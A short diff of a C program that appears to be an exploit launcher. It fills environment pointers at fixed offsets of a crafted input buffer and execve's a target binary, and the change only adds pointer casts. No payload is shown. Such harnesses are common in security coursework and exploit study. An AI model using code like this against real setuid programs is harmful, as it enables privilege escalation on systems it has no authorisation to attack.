@@ -33,15 +33,15 @@ main ( int argc, char * argv[] )
     args[1] = (char *) input;
     args[2] = NULL;
 
-    env[0] = &input[275];
-    env[1] = &input[276];
-    env[2] = &input[301]; // 0 "\0"
-    env[3] = &input[302];
-    env[4] = &input[303];
+    env[0] = (char *) &input[275];
+    env[1] = (char *) &input[276];
+    env[2] = (char *) &input[301]; // 0 "\0"
+    env[3] = (char *) &input[302];
+    env[4] = (char *) &input[303];
     env[5] = NULL;
 
     if ( execve (TARGET, args, env) < 0 )
         fprintf (stderr, "execve failed.\n");
 
     return (0);
-}"\0"
+}
